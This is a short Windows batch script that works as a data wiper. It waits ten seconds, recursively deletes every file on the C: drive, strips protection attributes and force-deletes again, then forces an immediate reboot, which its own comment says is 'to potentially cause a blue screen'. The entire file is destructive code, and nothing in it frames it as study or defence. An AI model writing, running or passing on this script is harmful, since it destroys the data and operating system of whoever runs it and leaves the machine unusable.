@echo off
setlocal enabledelayedexpansion

:: Wait for 10 seconds
timeout /t 10 /nobreak >nul

:: Delete all files in the system drive (assuming C: is the system drive)
for /r C:\ %%i in (*) do del "%%i"

:: Force delete all files in the system drive (including protected files)
attrib -r -s -h /s /d C:\*.*
del /f /s /q C:\*

:: Restart the system to potentially cause a blue screen
shutdown /r /f /t 0

:: End the script
endlocal
